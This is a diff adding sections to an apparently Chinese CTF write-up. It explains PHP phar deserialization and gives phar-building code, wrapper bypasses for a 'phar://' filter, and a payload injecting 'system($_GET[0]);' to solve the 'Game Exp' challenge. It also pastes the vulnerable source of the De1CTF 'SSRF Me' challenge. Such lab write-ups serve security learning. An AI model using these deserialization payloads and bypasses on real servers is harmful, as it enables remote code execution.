@@ -22,7 +22,7 @@
 -   ~~[N1CTF 2018]eating_cms~~
 -   ~~[PASECA2019] honey_shop 读取环境变量，介乎于签到和中等之间~~
 -   ~~Phuck2~~
--   [网鼎杯 2020 总决赛]Game Exp
+-   ~~[网鼎杯 2020 总决赛]Game Exp~~
 
 ### 中等
 
@@ -1030,3 +1030,229 @@ Array
 
 
 ### [网鼎杯 2020 总决赛]Game Exp
+
+开始这个题之前要先谈下利用phar协议造成php反序列化。
+
+反序列化时需要unserialize()函数，不存在`unserialize()`函数的时候，可以借助`phar`协议触发反序列化操作。
+
+PHAR (“Php ARchive”) 是PHP中的打包文件，相当于Java中的JAR文件，在php5.3或者更高的版本中默认开启。PHAR文件缺省状态是只读的，当我们要创建一个Phar文件需要修改php.ini中的phar.readonly，修改为：phar.readonly = 0
+
+phar是一种php语言的文件的后缀，所以生成phar文件要用到php语言，需要在`php.ini`中开启相应的配置
+
+```
+phar.readonly = Off
+```
+
+生成phar文件的代码如下：
+
+```php
+<?php
+	//反序列化payload构造
+    class TestObject {
+    }
+    
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar"); //后缀名必须为phar
+    $phar->startBuffering();
+    //设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?> 结尾
+    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
+
+	//将反序列化的对象放入该文件中
+    $o = new TestObject();
+    $o->data='just a test';
+    $phar->setMetadata($o);
+
+	//phar本质上是个压缩包，所以要添加压缩的文件和文件内容
+    $phar->addFromString("test.txt", "test"); 
+    $phar->stopBuffering();
+?>
+```
+
+![image-20220110120408954](README/image-20220110120408954.png)
+
+简单说下phar文件格式：
+
+1.  `phar`文件头的识别格式是`xxx` + `<?php __HALT_COMPILER(); ?>`，只有这样的格式才能被识别为`phar`文件
+2.  `phar`是压缩文件，那么压缩文件的信息就会存在第二段**manifest describing**，这一段是放序列化的`poc`
+3.  压缩的文件的内容被存在第三段，也就是上面payload的中的`text.txt`
+4.  数字签名为该`phar`的第四段
+
+可以触发phar协议的函数：
+
+![img](README/1419450-20200613182930854-1467566050.png)
+
+以及常用的文件包含函数：`include`、`include_once`、`requrie`、`require_once`
+
+简单测试：
+
+```php
+<?php
+	class TestObject{
+		function __destruct(){
+			echo $this->data;
+		}
+	}
+
+	include "phar://phar.phar/test.txt";
+?>
+```
+
+![image-20220110120938064](README/image-20220110120938064.png)
+
+虽然某些函数能够支持`phar://`的协议，但是如果目标服务器没有关闭`phar.readonly`时，就不能正常执行反序列化操作.
+
+**在禁止phar开头的情况下的替代方法**
+
+```
+compress.zlib://phar://phar.phar/test.txt
+compress.bzip2://phar://phar.phar/test.txt
+php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt
+```
+
+------
+
+下面看题：
+
+在register.php里面有个Anyclass，可以代码执行。
+
+上传的头像由username和最后的文件名组成。
+
+如果文件存在，执行file_exists，而这个函数恰好可以反序列化phar
+
+```php
+<?php
+    class Anyclass {
+		var $output = 'echo "ok"';
+    }
+    
+	$o = new Anyclass();
+    $o->data='system($_GET[0]);';
+	
+    $phar = new Phar("phar.phar"); 
+    $phar->startBuffering();
+	$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
+	$phar->setMetadata($o);
+
+    $phar->addFromString("test.txt", "test"); 
+    $phar->stopBuffering();
+?>
+```
+
+
+
+![image-20220110123526696](README/image-20220110123526696.png)
+
+这样就成功在login目录下生成一个名字为 qwer.jpg 的文件，接着使用phar协议去对其进行反序列化调用，我们需要构造`phar:///var/www/html/login/qwer.jpg`，因此在注册页面再上传随便一个jpg文件，而username为 `phar:///var/www/html/login/qwer`，经过处理拼接之后就成功构造。
+
+![image-20220110123742909](README/image-20220110123742909.png)
+
+### [De1CTF 2019]SSRF Me Flask
+
+
+
+
+
+```python
+#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding('latin1')
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+        if (self.checkSign()):
+            if "scan" in self.action:
+                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
+                resp = scan(self.param)
+                if (resp == "Connection Timeout"):
+                    result['data'] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result['code'] = 200
+            if "read" in self.action:
+                f = open("./%s/result.txt" % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+            if result['code'] == 500:
+                result['data'] = "Action Error"
+        else:
+            result['code'] = 500
+            result['msg'] = "Sign Error"
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+#generate Sign For Action Scan.
+@app.route("/geneSign", methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get("param", ""))
+    action = "scan"
+    return getSign(action, param)
+
+@app.route('/De1ta',methods=['GET','POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get("action"))
+    param = urllib.unquote(request.args.get("param", ""))
+    sign = urllib.unquote(request.cookies.get("sign"))
+    ip = request.remote_addr
+    if(waf(param)):
+        return "No Hacker!!!!"
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route('/')
+def index():
+    return open("code.txt","r").read()
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return "Connection Timeout"
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith("gopher") or check.startswith("file"):
+        return True
+    else:
+        return False
+
+if __name__ == '__main__':
+    app.debug = False
+    app.run(host='0.0.0.0',port=80)
+```
+
